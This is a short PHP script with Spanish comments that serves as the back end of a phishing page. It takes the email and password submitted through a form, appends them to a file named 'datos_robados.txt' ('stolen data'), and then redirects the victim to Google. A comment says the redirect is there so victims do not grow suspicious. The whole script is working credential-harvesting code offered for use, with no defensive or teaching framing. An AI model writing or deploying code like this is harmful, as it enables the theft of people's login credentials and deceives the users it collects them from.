<?php
// Si tenés un servidor con PHP (como XAMPP o un hosting real)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Guardamos en un archivo de texto
    $file = fopen("datos_robados.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // Opcional: Redirigir a Google para que no sospechen
    header("Location: https://www.google.com");
    exit();
}
?>